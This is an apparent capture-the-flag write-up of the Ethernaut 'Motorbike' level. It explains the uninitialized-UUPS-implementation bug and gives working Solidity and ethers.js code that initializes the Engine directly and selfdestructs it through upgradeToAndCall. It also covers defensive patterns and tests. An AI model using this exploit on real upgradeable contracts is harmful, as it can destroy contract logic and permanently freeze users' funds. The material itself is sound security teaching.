# Level 25: Motorbike Challenge

## Challenge Description

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to selfdestruct its engine and make the motorbike unusable?

**Things that might help:**
- EIP-1967
- UUPS upgradeable pattern
- Initializable contract

## Contract Location

The challenge contracts are located at:
```
/contracts/level-25-motorbike/MotorBike.sol
```

## Understanding the Challenge

This level involves TWO contracts in a UUPS (Universal Upgradeable Proxy Standard) pattern:

### 1. Motorbike (The Proxy)

```solidity
contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }
}
```

### 2. Engine (The Implementation)

```solidity
contract Engine is Initializable {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }
}
```

## The Vulnerability: Uninitialized Implementation

### Understanding UUPS Pattern

**UUPS vs Transparent Proxy:**

```
Transparent Proxy:
┌──────────────────┐
│  Proxy Contract  │ ← Upgrade logic HERE
│  - admin         │
│  - upgrade()     │
└────────┬─────────┘
         │ delegatecall
         ▼
┌──────────────────┐
│ Implementation   │ ← Just business logic
│  - functions     │
└──────────────────┘

UUPS Proxy:
┌──────────────────┐
│  Proxy Contract  │ ← Minimal proxy, just forwards
│  - fallback()    │
└────────┬─────────┘
         │ delegatecall
         ▼
┌──────────────────┐
│ Implementation   │ ← Upgrade logic HERE!
│  - functions     │
│  - upgrade()     │ ← DANGEROUS if not protected!
└──────────────────┘
```

**Key Difference:**
- Transparent Proxy: Upgrade logic in proxy (safer)
- UUPS: Upgrade logic in implementation (more gas efficient but riskier)

### The Critical Mistake

When the Motorbike proxy is deployed:

```solidity
constructor(address _logic) public {
    _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
    (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
    require(success, "Call failed");
}
```

What happens:
1. Proxy stores Engine address in its storage
2. Proxy calls `initialize()` via **delegatecall**
3. delegatecall executes in PROXY's storage context
4. `upgrader = msg.sender` writes to PROXY's storage (slot 0)
5. The **Engine implementation itself is NEVER initialized!**

### Why This is Dangerous

```
Proxy Storage (after constructor):
┌─────────┬──────────────────┐
│ Slot 0  │ upgrader = deployer │ ← Set via delegatecall
│ Slot 1  │ horsePower = 1000   │ ← Set via delegatecall
└─────────┴──────────────────┘

Engine Implementation Storage (standalone contract):
┌─────────┬──────────────────┐
│ Slot 0  │ upgrader = 0x0000   │ ← UNINITIALIZED!
│ Slot 1  │ horsePower = 0      │ ← UNINITIALIZED!
└─────────┴──────────────────┘
```

The Engine implementation is a **separate contract** on the blockchain that anyone can interact with directly!

## Complete Attack Strategy

### Step 1: Find the Implementation Address

The implementation address is stored in EIP-1967 slot:
```
keccak256("eip1967.proxy.implementation") - 1
= 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
```

Read this storage slot from the Motorbike proxy:
```javascript
const implAddress = await ethers.provider.getStorage(
    motorbikeAddress,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
);
```

### Step 2: Initialize the Implementation Directly

Call `initialize()` on the Engine implementation (NOT through the proxy!):

```solidity
// Call directly on implementation
engine.initialize();

// Now we're the upgrader of the implementation!
```

**Why this works:**
- The implementation is uninitialized
- The `initializer` modifier only prevents double-initialization
- Anyone can be the first to initialize it
- We become the `upgrader` in the **implementation's storage**

### Step 3: Deploy a Malicious Contract

Create a contract with a selfdestruct function:

```solidity
contract SelfDestructor {
    function destroy() external {
        selfdestruct(address(0));
    }
}
```

### Step 4: Upgrade and Destroy

Call `upgradeToAndCall` on the implementation:

```solidity
bytes memory data = abi.encodeWithSignature("destroy()");
engine.upgradeToAndCall(selfDestructorAddress, data);
```

**What happens:**
1. `_authorizeUpgrade()` checks: Is `msg.sender == upgrader`?
   - Yes! We initialized it, so we're the upgrader ✓
2. `_setImplementation()` updates the implementation slot
3. `newImplementation.delegatecall(data)` executes `destroy()`
4. **delegatecall executes in Engine's context!**
5. `selfdestruct(address(0))` destroys the **Engine**, not SelfDestructor!

**Result:**
- Engine implementation is destroyed
- Motorbike proxy still exists but points to destroyed code
- All calls fail
- Motorbike is unusable! 🏍️💥

## Visual Flow

```
Initial State:
┌────────────────────────────────────────────────┐
│ Motorbike Proxy                                │
│ Slot: 0x360894... = 0xEngineAddress            │
│                                                 │
│ Proxy Storage (via delegatecall):              │
│   Slot 0: upgrader = 0xDeployer                │
│   Slot 1: horsePower = 1000                    │
└─────────────────┬──────────────────────────────┘
                  │
                  │ points to
                  ▼
┌────────────────────────────────────────────────┐
│ Engine Implementation (0xEngineAddress)        │
│                                                 │
│ Implementation Storage (UNINITIALIZED):        │
│   Slot 0: upgrader = 0x0000 ← VULNERABLE!      │
│   Slot 1: horsePower = 0                       │
│                                                 │
│ Code: upgrade logic, initialize(), etc.        │
└────────────────────────────────────────────────┘
```

After Attack:
```
┌────────────────────────────────────────────────┐
│ Motorbike Proxy                                │
│ Slot: 0x360894... = 0xEngineAddress            │
│   (still points to same address)               │
└─────────────────┬──────────────────────────────┘
                  │
                  │ points to DESTROYED code!
                  ▼
┌────────────────────────────────────────────────┐
│ 0xEngineAddress                                │
│                                                 │
│ ❌ NO CODE (selfdestructed)                    │
│                                                 │
│ All calls to proxy now fail!                   │
└────────────────────────────────────────────────┘
```

## Hint for Thinking

Ask yourself:
* Where is the implementation contract stored on the blockchain?
* Can you interact with it directly (not through the proxy)?
* What happens when delegatecall is used to initialize?
* Whose storage gets initialized - proxy or implementation?
* What if someone initializes the implementation directly?
* Can you upgrade an implementation to run any code you want?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

### Attack Code

```solidity
// 1. Deploy a self-destructor
contract SelfDestructor {
    function destroy() external {
        selfdestruct(address(0));
    }
}

// 2. Execute the attack
async function attack() {
    // Find implementation address
    const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
    const implAddress = await ethers.provider.getStorage(motorbikeAddress, IMPLEMENTATION_SLOT);
    const engineAddress = "0x" + implAddress.slice(-40);
    
    // Connect to Engine directly
    const engine = await ethers.getContractAt("Engine", engineAddress);
    
    // Initialize the implementation
    await engine.initialize();
    
    // Deploy SelfDestructor
    const SelfDestructor = await ethers.getContractFactory("SelfDestructor");
    const destructor = await SelfDestructor.deploy();
    
    // Upgrade and destroy
    const destroyData = destructor.interface.encodeFunctionData("destroy");
    await engine.upgradeToAndCall(destructor.address, destroyData);
    
    // Engine is now destroyed!
}
```

### Execution Steps

1. **Deploy the Motorbike contracts:**
   ```shell
   npx hardhat deploy --tags motorbike --network sepolia
   ```

2. **Execute the exploit directly (no need for exploit contract):**
   ```shell
   TARGET_ADDRESS=0xYourMotorbikeAddress npx hardhat run scripts/level-25-motorbike/execute-motorbike-exploit.ts --network sepolia
   ```

## Key Takeaways

### 1. Always Initialize Implementation Contracts

```solidity
// ❌ BAD: Leave implementation uninitialized
contract MyImplementation is Initializable {
    function initialize() external initializer {
        // ...
    }
}

// Deployment:
implementation = new MyImplementation(); // Uninitialized!
proxy = new Proxy(implementation);      // Calls initialize via delegatecall

// ✅ GOOD: Initialize implementation immediately
contract MyImplementation is Initializable {
    function initialize() external initializer {
        // ...
    }
}

// Deployment:
implementation = new MyImplementation();
implementation.initialize();  // Initialize the implementation itself!
proxy = new Proxy(implementation);  // Also initialize via proxy
```

**Even better - use constructor to disable initialization:**

```solidity
contract MyImplementation is Initializable {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();  // Prevent anyone from initializing
    }
    
    function initialize() external initializer {
        // Can only be called via proxy delegatecall
    }
}
```

### 2. UUPS is Riskier than Transparent Proxy

**Transparent Proxy Pattern (Safer):**
- Upgrade logic in proxy
- Implementation is just business logic
- Even if implementation is compromised, can't affect upgrade

**UUPS Pattern (Riskier but Gas Efficient):**
- Upgrade logic in implementation
- If implementation is compromised, attacker controls upgrades
- Must be very careful with initialization

### 3. Understand delegatecall Context

```solidity
// Proxy calls:
implementation.delegatecall(abi.encodeWithSignature("initialize()"));

// Executes in PROXY's storage:
function initialize() external {
    horsePower = 1000;      // Writes to PROXY's slot 1
    upgrader = msg.sender;  // Writes to PROXY's slot 0
}

// Implementation's own storage is UNTOUCHED!
```

### 4. Use OpenZeppelin's UUPS Pattern Correctly

```solidity
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract MyContract is Initializable, UUPSUpgradeable {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
    
    function initialize() public initializer {
        __UUPSUpgradeable_init();
        // Your initialization logic
    }
    
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
```

### 5. EIP-1967 Storage Slots

Standard storage slots to avoid collisions:

```solidity
// Implementation slot
bytes32 private constant _IMPLEMENTATION_SLOT = 
    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
// Admin slot
bytes32 private constant _ADMIN_SLOT = 
    0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    
// Beacon slot  
bytes32 private constant _BEACON_SLOT = 
    0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;
```

## Real-World Implications

### Historical Exploits

Similar vulnerabilities have appeared in real protocols:

1. **Parity Multi-Sig Wallet (2017)**
   - Library contract was killable
   - Someone called kill() on the library
   - All wallets using it became unusable
   - $150M+ frozen forever

2. **Audius (2022)**
   - Uninitialized proxy implementation
   - Attacker initialized and took control
   - $6M stolen
   - Similar to this Ethernaut challenge!

3. **Cream Finance (Multiple)**
   - Various proxy initialization issues
   - Led to multiple exploits
   - Tens of millions lost

### Best Practices Checklist

Deploying upgradeable contracts:

- [ ] Use OpenZeppelin's upgradeable contracts
- [ ] Call `_disableInitializers()` in implementation constructor
- [ ] Initialize implementation immediately after deployment
- [ ] Use `initializer` modifier on initialize functions
- [ ] Never leave implementation contracts publicly accessible
- [ ] Consider using Transparent Proxy instead of UUPS for sensitive contracts
- [ ] Audit all upgrade paths thoroughly
- [ ] Use multi-sig for upgrade authority
- [ ] Add timelock to upgrades
- [ ] Test initialization thoroughly

### Secure Deployment Pattern

```javascript
// 1. Deploy implementation
const Implementation = await ethers.getContractFactory("MyImplementation");
const implementation = await Implementation.deploy();
await implementation.waitForDeployment();

// 2. Implementation constructor calls _disableInitializers()
// This prevents direct initialization of the implementation

// 3. Deploy proxy with initialization
const Proxy = await ethers.getContractFactory("ERC1967Proxy");
const initData = implementation.interface.encodeFunctionData("initialize", [args]);
const proxy = await Proxy.deploy(implementation.address, initData);

// 4. The implementation is now safe:
//    - Cannot be initialized directly (disabled in constructor)
//    - Proxy has been properly initialized
//    - Only proxy admin can upgrade
```

### Testing Upgradeable Contracts

```javascript
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");

describe("UUPS Implementation Security", function() {
    it("should prevent direct initialization of implementation", async function() {
        const Implementation = await ethers.getContractFactory("MyImplementation");
        const implementation = await Implementation.deploy();
        
        // Try to initialize implementation directly
        await expect(
            implementation.initialize()
        ).to.be.revertedWith("Initializable: contract is already initialized");
    });
    
    it("should only allow authorized upgrades", async function() {
        const [owner, attacker] = await ethers.getSigners();
        
        const V1 = await ethers.getContractFactory("MyContractV1");
        const proxy = await upgrades.deployProxy(V1, { kind: 'uups' });
        
        const V2 = await ethers.getContractFactory("MyContractV2");
        const v2Implementation = await V2.deploy();
        
        // Attacker tries to upgrade
        await expect(
            proxy.connect(attacker).upgradeTo(v2Implementation.address)
        ).to.be.revertedWith("Can't upgrade");
        
        // Owner can upgrade
        await expect(
            proxy.connect(owner).upgradeTo(v2Implementation.address)
        ).to.not.be.reverted;
    });
});
```

## The Lesson

**Key Takeaways:**

1. **Implementation contracts are real contracts** - They exist on-chain and can be called directly

2. **delegatecall doesn't initialize implementation** - Only the proxy's storage gets initialized

3. **Always disable implementation initialization** - Use `_disableInitializers()` in constructor

4. **UUPS is powerful but dangerous** - Upgrade logic in implementation means higher risk

5. **Test initialization thoroughly** - Ensure implementation can't be hijacked

6. **Use established patterns** - OpenZeppelin's patterns have safety mechanisms

7. **Audit proxy deployments carefully** - Initialization bugs are catastrophic

8. **Consider Transparent Proxy for critical contracts** - Safer upgrade pattern

## Additional Resources

### Proxy Pattern Comparison

| Feature | Transparent Proxy | UUPS | Beacon |
|---------|------------------|------|--------|
| Upgrade logic | In proxy | In implementation | In beacon |
| Gas cost | Higher | Lower | Medium |
| Security | Safer | Riskier | Medium |
| Flexibility | Low | High | Medium |
| Implementation risk | Low | High | Medium |

### When to Use Each Pattern

- **Transparent Proxy**: High-value contracts, when safety is paramount
- **UUPS**: Gas-sensitive contracts, when you trust implementation security
- **Beacon**: Multiple proxies sharing one implementation

## Conclusion

The Motorbike challenge teaches us that:

1. **Implementation contracts are accessible** - Not just logical abstractions
2. **Initialization in upgradeable contracts is critical** - Must be done correctly
3. **UUPS pattern has inherent risks** - Upgrade logic in implementation is dangerous
4. **delegatecall context matters** - Understand whose storage is being modified
5. **selfdestruct via delegatecall** - Destroys the caller, not the callee

This level brilliantly demonstrates why OpenZeppelin's `_disableInitializers()` pattern exists and why implementation contract security is just as important as proxy security. A single uninitialized implementation can brick an entire system! 🔐🏍️
